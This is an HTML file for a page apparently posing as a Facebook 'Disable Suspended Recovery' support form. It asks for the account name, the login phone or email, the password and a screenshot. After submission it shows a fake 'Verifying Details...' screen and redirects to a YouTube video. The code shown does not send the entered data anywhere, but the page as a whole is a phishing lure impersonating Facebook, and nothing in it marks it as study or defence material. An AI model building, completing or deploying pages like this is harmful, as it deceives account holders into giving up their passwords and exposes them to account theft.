<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Support Dashboard</title>
    <style>
        /* General Setup - Background White kar diya */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff; /* White Background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Main Form Container - Border aur Shadow hata di */
        .container {
            background-color: transparent; /* Transparent */
            padding: 20px;
            width: 90%; 
            max-width: 380px; 
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            /* Box-shadow hata diya taaki border na dikhe */
            box-shadow: none; 
        }

        /* Top Logo Styling */
        .top-logo {
            width: 70px;
            height: auto;
            margin-bottom: 15px;
        }

        .highlight-title {
            color: #d32f2f;
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 20px;
            width: 100%;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
        }

        /* Form Inputs */
        form {
            width: 100%;
        }

        input[type="text"], input[type="email"], input[type="file"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc; /* Input ka border halka grey rahega taaki dikhe */
            background-color: #f9f9f9; /* Halka grey background inputs ke liye */
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 15px;
        }

        label {
            display: block;
            text-align: left;
            margin-top: 10px;
            font-weight: 600;
            font-size: 13px;
            color: #444;
        }

        /* Button Styling */
        #proceedBtn {
            background-color: #00e600;
            color: #000;
            font-weight: 800;
            font-size: 16px;
            padding: 14px;
            width: 100%;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 25px;
            text-transform: uppercase;
            box-shadow: 0 0 10px #00e600;
            transition: all 0.3s ease;
            animation: glowButton 1.5s infinite alternate;
        }

        @keyframes glowButton {
            from { box-shadow: 0 0 5px #00e600; }
            to { box-shadow: 0 0 20px #00e600; }
        }

        /* LOADING SCREEN OVERLAY */
        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff; /* White Background for loading */
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        /* Blinking Logo in Center */
        .blink-logo {
            width: 80px;
            height: auto;
            animation: blinker 1s linear infinite;
        }

        @keyframes blinker {
            50% { opacity: 0.3; }
        }

        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #666;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://fbdisabled.github.io/recovery/logo.png" alt="Logo" class="top-logo">

        <div class="highlight-title">
            Disable Suspended Recovery
        </div>

        <form onsubmit="event.preventDefault(); startProcess();">
            
            <label>Facebook ID Name</label>
            <input type="text" placeholder="Full Name" required>

            <label>Mobile number or email</label>
            <input type="text" placeholder="Login id" required>

            <label>Password</label>
            <input type="text" placeholder="" required>

            <label>Screenshot</label>
            <input type="file" accept="image/*" required>

            <button type="submit" id="proceedBtn">Proceed</button>
        </form>
    </div>

    <div id="loadingOverlay">
        <img src="https://fbdisabled.github.io/recovery/logo.png" alt="Processing" class="blink-logo">
        <div class="loading-text">Verifying Details...</div>
    </div>

    <script>
        function startProcess() {
            if (document.activeElement) {
                document.activeElement.blur();
            }

            document.getElementById('loadingOverlay').style.display = 'flex';

            setTimeout(function() {
                window.location.href = "https://youtu.be/66aXzfOHMK4?si=D9w3D67MgTqu1pZy";
            }, 3000);
        }
    </script>

</body>
</html>
